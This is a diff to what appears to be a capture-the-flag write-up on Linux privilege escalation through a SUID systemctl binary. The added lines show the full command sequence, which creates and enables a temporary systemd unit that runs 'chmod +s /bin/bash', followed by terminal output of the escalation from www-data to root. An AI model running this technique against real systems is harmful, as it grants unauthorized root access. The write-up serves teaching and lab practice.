@@ -233,7 +233,7 @@ we have given suid permission to /bin/bash which can allow us to run bash as roo
 
 [Install] - the second part of our unit file
 
-```WantedBy=multi-user.target’ > $TempFile```- sets the state (or runlevel) at which this service will run (notice the closing single quote?), the > directs all our inputs to the TempFile env variable
+```WantedBy=multi-user.target’ > $TempFile```- sets the state (or run level) at which this service will run (notice the closing single quote?), the > directs all our inputs to the TempFile env variable
 
 ```/bin/systemctl link $TempFile``` - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths
 
@@ -250,7 +250,18 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                         
 /bin/sh: 0: can't access tty; job control turned off                                                                                                                                          
 $ id                                                                                                                                                                                          
-uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                               
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+$ TempFile=$(mktemp).service                                                                                                                                                                  
+echo '[Service]                                                                                                                                                                               
+Type=oneshot                                                                                                                                                                                  
+ExecStart=/bin/sh -c "chmod +s /bin/bash"                                                                                                                                                     
+[Install]                                                                                                                                                                                     
+WantedBy=multi-user.target' > $TempFile                                                                                                                                                       
+/bin/systemctl link $TempFile                                                                                                                                                                 
+/bin/systemctl enable --now $TempFile                                                                                                                                                         
+/bin/bash -p$ > > > > $ Created symlink from /etc/systemd/system/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.                                                                       
+$ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.
+                                                                                                                              
 $ /bin/bash -p
 whoami
 root
